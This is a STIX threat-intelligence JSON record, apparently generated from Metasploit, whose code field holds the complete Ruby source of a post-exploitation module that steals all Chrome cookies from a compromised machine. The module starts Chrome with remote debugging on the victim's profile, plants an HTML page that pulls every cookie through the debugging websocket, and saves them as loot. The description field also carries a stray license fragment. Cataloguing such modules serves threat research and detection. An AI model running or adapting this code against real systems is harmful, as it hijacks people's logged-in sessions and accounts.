{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--5c95c33e-c5b3-4088-b41a-5283c03feaf0",
    "created": "2024-08-14T16:33:19.159438Z",
    "modified": "2024-08-14T16:33:19.159442Z",
    "name": "Chrome Gather Cookies",
    "description": "Read all cookies from the Default Chrome profile of the target user. 'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/post/multi/gather/chrome_cookies.rb",
            "external_id": "chrome_cookies.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Post\n  include Msf::Post::File\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Chrome Gather Cookies',\n        'Description' => 'Read all cookies from the Default Chrome profile of the target user.',\n        'License' => MSF_LICENSE,\n        'Author' => ['mangopdf <mangodotpdf[at]gmail.com>'],\n        'Platform' => %w[linux unix bsd osx windows],\n        'SessionTypes' => %w[meterpreter shell]\n      )\n    )\n\n    register_options(\n      [\n        OptString.new('CHROME_BINARY_PATH', [false, \"The path to the user's Chrome binary (leave blank to use the default for the OS)\", '']),\n        OptString.new('WRITEABLE_DIR', [false, 'Where to write the html used to steal cookies temporarily, and the cookies. Leave blank to use the default for the OS (/tmp or AppData\\\\Local\\\\Temp)', '']),\n        OptInt.new('REMOTE_DEBUGGING_PORT', [false, 'Port on target machine to use for remote debugging protocol', 9222])\n      ]\n    )\n  end\n\n  def configure_for_platform\n    vprint_status('Determining session platform')\n    vprint_status(\"Platform: #{session.platform}\")\n    vprint_status(\"Type: #{session.type}\")\n\n    if session.platform == 'windows'\n      username = get_env('USERNAME').strip\n    else\n      username = cmd_exec 'id -un'\n    end\n\n    temp_storage_dir = datastore['WRITABLE_DIR']\n\n    case session.platform\n    when 'unix', 'linux', 'bsd', 'python'\n      chrome = 'google-chrome'\n      user_data_dir = \"/home/#{username}/.config/google-chrome\"\n      temp_storage_dir = temp_storage_dir.nil? ? '/tmp' : temp_storage_dir\n      @cookie_storage_path = \"#{temp_storage_dir}/#{Rex::Text.rand_text_alphanumeric(10..15)}\"\n    when 'osx'\n      chrome = '\"/Applications/Google Chrome.app/Contents/MacOS/Google Chrome\"'\n      user_data_dir = expand_path \"/Users/#{username}/Library/Application Support/Google/Chrome\"\n      temp_storage_dir = temp_storage_dir.nil? ? '/tmp' : temp_storage_dir\n      @cookie_storage_path = \"#{temp_storage_dir}/#{Rex::Text.rand_text_alphanumeric(10..15)}\"\n    when 'windows'\n      chrome = '\"\\\\Program Files (x86)\\\\Google\\\\Chrome\\\\Application\\\\chrome.exe\"'\n      user_data_dir = \"\\\\Users\\\\#{username}\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\"\n      temp_storage_dir = temp_storage_dir.nil? ? \"\\\\Users\\\\#{username}\\\\AppData\\\\Local\\\\Temp\" : temp_storage_dir\n      @cookie_storage_path = \"#{user_data_dir}\\\\chrome_debug.log\"\n    else\n      fail_with Failure::NoTarget, \"Unsupported platform: #{session.platform}\"\n    end\n\n    unless datastore['CHROME_BINARY_PATH'].empty?\n      chrome = datastore['CHROME_BINARY_PATH']\n    end\n\n=begin\n    # #writable? not supported on windows\n    unless writable? @temp_storage_dir\n      fail_with Failure::BadConfig, \"#{@temp_storage_dir} is not writable\"\n    end\n=end\n\n    @html_storage_path = create_cookie_stealing_html(temp_storage_dir)\n\n    chrome_debugging_args = []\n\n    if session.platform == 'windows'\n      # `--headless` doesn't work on Windows, so use an offscreen window instead.\n      chrome_debugging_args << '--window-position=0,0'\n      chrome_debugging_args << '--enable-logging --v=1'\n    else\n      chrome_debugging_args << '--headless'\n    end\n\n    chrome_debugging_args_all_platforms = [\n      '--disable-translate',\n      '--disable-extensions',\n      '--disable-background-networking',\n      '--safebrowsing-disable-auto-update',\n      '--disable-sync',\n      '--metrics-recording-only',\n      '--disable-default-apps',\n      '--mute-audio',\n      '--no-first-run',\n      '--disable-web-security',\n      '--disable-plugins',\n      '--disable-gpu'\n    ]\n\n    chrome_debugging_args << chrome_debugging_args_all_platforms\n    chrome_debugging_args << \" --user-data-dir=\\\"#{user_data_dir}\\\"\"\n    chrome_debugging_args << \" --remote-debugging-port=#{datastore['REMOTE_DEBUGGING_PORT']}\"\n    chrome_debugging_args << \" #{@html_storage_path}\"\n\n    @chrome_debugging_cmd = \"#{chrome} #{chrome_debugging_args.join(' ')}\"\n  end\n\n  def create_cookie_stealing_html(temp_storage_dir)\n    cookie_stealing_html = %(\n      <!DOCTYPE html>\n      <html lang=\"en\">\n      <head>\n        <meta charset=\"utf-8\">\n        <title>index.html</title>\n      </head>\n      <body>\n          <script>\n\n              var remoteDebuggingPort = #{datastore['REMOTE_DEBUGGING_PORT']};\n              var request = new XMLHttpRequest();\n              request.open(\"GET\", \"http://localhost:\" + remoteDebuggingPort + \"/json\");\n              request.responseType = 'json';\n              request.send();\n\n              request.onload = function() {\n                var webSocketDebuggerUrl = request.response[0].webSocketDebuggerUrl;\n                console.log(webSocketDebuggerUrl);\n                var connection = new WebSocket(webSocketDebuggerUrl);\n\n                connection.onopen = function () {\n                  connection.send('{\"id\": 1, \"method\": \"Network.getAllCookies\"}');\n                };\n\n                connection.onmessage = function (e) {\n                  var cookies_blob = JSON.stringify(JSON.parse(e.data).result.cookies);\n                  console.log('REMOTE_DEBUGGING|' + cookies_blob);\n                };\n              }\n          </script>\n      </body>\n      </html>\n    )\n\n    # Where to temporarily store the cookie-stealing html\n    if session.platform == 'windows'\n      html_storage_path = \"#{temp_storage_dir}\\\\#{Rex::Text.rand_text_alphanumeric(10..15)}.html\"\n    else\n      html_storage_path = \"#{temp_storage_dir}/#{Rex::Text.rand_text_alphanumeric(10..15)}.html\"\n    end\n\n    write_file(html_storage_path, cookie_stealing_html)\n    html_storage_path\n  end\n\n  def cleanup\n    if file?(@html_storage_path)\n      vprint_status(\"Removing file #{@html_storage_path}\")\n      rm_f @html_storage_path\n    end\n\n    if file?(@cookie_storage_path)\n      vprint_status(\"Removing file #{@cookie_storage_path}\")\n      rm_f @cookie_storage_path\n    end\n  end\n\n  def get_cookies\n    if session.platform == 'windows'\n      chrome_cmd = @chrome_debugging_cmd.to_s\n      kill_cmd = 'taskkill /f /pid'\n    else\n      chrome_cmd = \"#{@chrome_debugging_cmd} > #{@cookie_storage_path} 2>&1\"\n      kill_cmd = 'kill -9'\n    end\n\n    if session.type == 'meterpreter'\n      chrome_pid = cmd_exec_get_pid(chrome_cmd)\n      print_status \"Activated Chrome's Remote Debugging (pid: #{chrome_pid}) via #{chrome_cmd}\"\n      Rex.sleep(5)\n\n      # read_file within if/else block because kill was terminating sessions on OSX during testing\n      chrome_output = read_file(@cookie_storage_path)\n\n      # Kills spawned chrome process in windows meterpreter sessions.\n      # In OSX and Linux the meterpreter sessions would stop as well.\n      if session.platform == 'windows'\n        kill_output = cmd_exec \"#{kill_cmd} #{chrome_pid}\"\n      end\n    else\n      # Using shell_command for backgrounding process (&)\n      client.shell_command(\"#{chrome_cmd} &\")\n      print_status \"Activated Chrome's Remote Debugging via #{chrome_cmd}\"\n      Rex.sleep(5)\n\n      chrome_output = read_file(@cookie_storage_path)\n    end\n\n    cookies_msg = ''\n    chrome_output.each_line do |line|\n      if line =~ /REMOTE_DEBUGGING/\n        print_good('Found Match')\n        cookies_msg = line\n      end\n    end\n\n    fail_with(Failure::Unknown, 'Failed to retrieve cookie data') if cookies_msg.empty?\n\n    # Slice off the \"REMOTE_DEBUGGING|\" delimiter and trailing source info\n    cookies_json = cookies_msg.split('REMOTE_DEBUGGING|')[1]\n    cookies_json.split('\", source: file')[0]\n  end\n\n  def save(msg, data, ctype = 'text/json')\n    ltype = 'chrome.gather.cookies'\n    loot = store_loot ltype, ctype, session, data, nil, msg\n    print_good \"#{msg} stored in #{loot}\"\n  end\n\n  def run\n    fail_with Failure::BadConfig, 'No session found, giving up' if session.nil?\n\n    # Issues with write_file. Maybe a path problem?\n    if session.platform == 'windows' && session.type == 'shell'\n      fail_with Failure::BadConfig, 'Windows shell session not support, giving up'\n    end\n\n    unless session.platform == 'windows' && session.type == 'meterpreter'\n      print_warning 'This module will leave a headless Chrome process running on the target machine.'\n    end\n\n    configure_for_platform\n    cookies = get_cookies\n    cookies_parsed = JSON.parse cookies\n    save \"#{cookies_parsed.length} Chrome Cookies\", cookies\n  end\nend\n",
    "x_mitre_platforms": [
        "%w[linux unix bsd osx windows]"
    ]
}